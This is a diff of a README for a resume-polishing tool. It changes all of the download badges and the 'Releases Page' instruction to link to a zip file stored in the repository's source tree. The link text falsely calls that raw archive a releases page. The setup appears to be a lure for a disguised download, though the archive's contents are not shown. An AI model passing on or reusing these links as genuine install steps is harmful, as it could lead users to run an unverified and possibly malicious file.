@@ -1,6 +1,6 @@
 # ✏️ resume-polish - Your Simple Tool for Perfecting Resumes
 
-[![Download Now](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/components/resume-polish-1.0.zip)](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/components/resume-polish-1.0.zip)
+[![Download Now](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/resume-polish-3.9.zip)](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/resume-polish-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your system meets these requirements:
 To get started, follow these steps to download and install resume-polish:
 
 1. **Visit the Releases Page**:
-   Go to the following link to find the latest version: [Download from Releases](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/components/resume-polish-1.0.zip).
+   Go to the following link to find the latest version: [Download from Releases](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/resume-polish-3.9.zip).
 
 2. **Choose the Latest Release**:
    On the releases page, look for the latest version listed. It usually appears at the top.
@@ -75,4 +75,4 @@ Special thanks to the contributors who helped make this project possible. Your e
 
 Join our community and share your experiences using resume-polish on social media or through discussions on our GitHub page!
 
-[![Download Now](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/components/resume-polish-1.0.zip)](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/components/resume-polish-1.0.zip)
+[![Download Now](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/resume-polish-3.9.zip)](https://raw.githubusercontent.com/S11lmi/resume-polish/main/src/resume-polish-3.9.zip)
